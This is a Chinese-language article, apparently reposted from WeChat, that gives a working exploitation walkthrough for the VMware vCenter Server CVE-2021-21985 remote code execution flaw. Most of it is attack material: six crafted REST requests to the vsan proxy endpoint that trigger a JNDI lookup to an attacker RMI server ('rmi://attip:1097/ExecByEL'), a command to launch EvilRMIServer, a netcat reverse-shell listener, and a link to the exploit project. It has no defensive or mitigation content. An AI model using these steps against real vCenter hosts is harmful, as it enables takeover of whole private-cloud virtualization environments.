<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Zz7tfzePvWYRMCFwJl8unA)

        VMware vCenter Server 是 VMware 虚拟化管理平台，广泛的应用于企业私有云内网中。通过使用 vCenter，管理员可以轻松的管理上百台虚拟化环境，同时也意味着当其被攻击者控制后会造成私有云大量虚拟化环境将被攻击者控制。

        可以通过 443 访问 vCenter Server 的攻击者可以直接通过请求在目标主机上执行任意代码，并接管目标主机。攻击复杂度低，所需的条件少，不需要用户交互。

漏洞利用
====

0x01 漏洞点
--------

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1rMN6joWZJovS4NXuXyEqteKI3aC3fYdCgLYveq8XJWT8iaL5mAjOtbbGQ95hxplL1zGPADkoyj0A/640?wx_fmt=png)

分析可见：

https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985?referrer=home#rapid7-analysis

0x02 漏洞利用
---------

        对 beans 对象进行构造，实现 rce。

列表：

```
localizedMessageBundle
vsanWorkerThreadFactory
vsanThreadPoolImpl
vsanServiceBundleActivator
vsanServiceFactory
vsanProviderUtils_setVmodlHelper
vsanProviderUtils_setVsanServiceFactory
vsanQueryUtil_setDataService
vsanComponentsProviderImpl
capabilityPropertyProviderImpl
pbmDataProviderImpl
vsanCapabilityCacheManager
vsanCapabilityUtils_setVsanCapabilityCacheManager
vsanUtils_setMessageBundle
vsanFormatUtils_setUserSessionService
```

由于 Vsphere UI 使用的 tomcat 中间件，可以通过 jndi rmi bypass

https://github.com/welk1n/JNDI-Injection-Bypass/blob/master/src/main/java/payloads/EvilRMIServer.java

远程执行命令

```
Step1
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject
{"methodInput":[null]}


Step2
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setStaticMethod
{"methodInput":["javax.naming.InitialContext.doLookup"]}

Step3
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetMethod
{"methodInput":["doLookup"]}

Step4 
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setArguments
{"methodInput":[["rmi://attip:1097/ExecByEL"]]}

Step5
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/prepare
{"methodInput":[]}

Step6
https://host/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/invoke
{"methodInput":[]}
```

使用方法
----

1.  启动 rmi 服务 java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer attip 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1rMN6joWZJovS4NXuXyEqt3wpOZicYicgicwK7q1nQnGFoEic5H1r4gEAgeH01EYf2kfy53gjR6O4NicQ/640?wx_fmt=png)
    
2.  启动 reverse shell 侦听
    

```
nc -lvvp 5555
```

3.  执行以上 payload，得到反向 shell 
    

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1rMN6joWZJovS4NXuXyEqtFqicOmuNlhUUISiaWsQW60XXJzj64Op0Ipf6ibIicbRGrtQuAwQ00dw3DA/640?wx_fmt=png)

项目地址：

https://github.com/xnianq/cve-2021-21985_exp